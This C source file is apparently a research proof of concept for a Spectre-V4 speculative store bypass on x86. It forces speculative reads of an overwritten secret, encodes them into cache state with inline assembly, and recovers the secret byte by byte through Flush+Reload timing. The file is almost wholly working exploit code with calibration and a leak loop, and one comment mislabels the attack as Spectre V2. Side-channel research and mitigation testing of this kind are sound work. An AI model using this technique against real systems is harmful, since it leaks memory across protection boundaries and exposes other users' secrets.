/*************************
 * Description: A PoC to confirm Spectre-V4 on x86
 *
 * Author: guowenquan@iie.ac.cn
 * *************************/

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <sched.h>
#include <unistd.h>
#include <sys/mman.h>
#include "../tools/tools.h"

#define STRIDE 4096

#define TARGET_CPU 1

// inaccessible (overwritten) secret
#define OVERWRITE '#'

const char *secret = "Spectre V4 PoC Success!";
uint32_t finished_one = 0;

char *data;
uint8_t *array = NULL;
volatile uint8_t temp = 0;

char victim_function(int x)
{
    // store secret in data
    strcpy(data, secret);
    // flushing the data which is used in the condition increases
    // probability of speculation
    MFENCE;
    char **data_slowptr = &data;
    char ***data_slowslowptr = &data_slowptr;
    MFENCE;
    flush_addr(&x);
    flush_addr(data_slowptr);
    flush_addr(&data_slowptr);
    flush_addr(data_slowslowptr);
    flush_addr(&data_slowslowptr);
    // ensure data is flushed at this point
    MFENCE;

    // overwrite data via different pointer
    // pointer chasing makes this extremely slow
    (*(*data_slowslowptr))[x] = OVERWRITE;

    // data[x] should now be "#"
    // uncomment next line to break attack
    // mfence();
    // Encode stale value in the cache
    __asm__ volatile (
        "movzbl (%[saddr]), %%eax      \n\t"   // 读 data[x] → eax
        "shl    $12, %%rax             \n\t"   // *= 4096
        "movb   (%[target], %%rax, 1), %%al \n\t" // 读 array[offset] → al（仅为了缓存）
        :
        : [saddr]  "r" (&data[x]),      // 注意：这里直接取 &data[x]
          [target] "r" (array)
        : "rax", "memory"
);
}

int recover_secret_byte(int secret_len, char recovered_string[],uint64_t threshold)
{
    int *results = alloca(256 * secret_len * sizeof(int));
    memset(results, 0, 256 * secret_len * sizeof(int));

    for (int tries = 999; tries > 0; tries--)
    {
        // 先清侧信道
        for (int i = 0; i < 256; i++)
            flush_addr(&array[i * STRIDE]);
        MFENCE;
        int index = tries % secret_len;
        victim_function(index);

        MFENCE;

        // 256 桶 = 128 页 × 2 偏移
        for (int off = 0; off < 2; off++)
        { // 0 或 2048
            // 128 页的顺序最好做一次 Fisher–Yates 打乱
            for (int page = 0; page < 128; page++)
            {
                int i = page * 2 + off; // 第 page 页的第 off 桶
                if (time_access(&array[i * STRIDE]) < threshold)
                    results[index * 256 + i]++;
            }
        }
    }

    // 统计时**跳过训练那一行**
    for (int i = 0; i < secret_len; i++)
    {
        int max = -1, best = -1;
        for (int j = 0; j < 256; j++)
        {
            if (j == '#')
                continue;
            if (results[i*256+j] > max)
            {
                max = results[i*256+j];
                best = j;
            }
        }
        recovered_string[i] = (best > 31 && best < 127) ? (char)best : '?';
    }

}

int main()
{

    array = mmap(NULL, 256 * STRIDE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
    if (array == MAP_FAILED)
    {
        printf("Error, cannot allocate memory.\n");
        return -1;
    }

    data = malloc(strlen(secret) + 1);


    // 2. 校准阈值
    uint64_t threshold = measure_access_time();
    if (threshold == 0)
    {
        fprintf(stderr, "Failed to calibrate threshold. Aborting.\n");
        restore_cpu();
        return 1;
    }

    // 3. 执行 Spectre V2 攻击
    memset(array, 1, 256 * STRIDE);
    size_t secret_len = strlen(secret);
    char recovered_string[secret_len + 1];

    printf("[*] Leaking secret: \"%s\"\n", secret);
    printf("[*] Starting attack...\n\n");
    fflush(stdout);

    //for(int i=0;i<5;i++)
    while(1)
    {
        memset(recovered_string, 0, sizeof(recovered_string));
        recover_secret_byte(secret_len, recovered_string,threshold);
        printf("\rLeaked: %s", recovered_string);
        fflush(stdout);
        if (!strncmp(recovered_string,secret,secret_len))
        	break;
    }

    printf("\n\n[*] Attack finished.\n\n");

    // 4. 恢复环境
    restore_cpu();

    return 0;
}
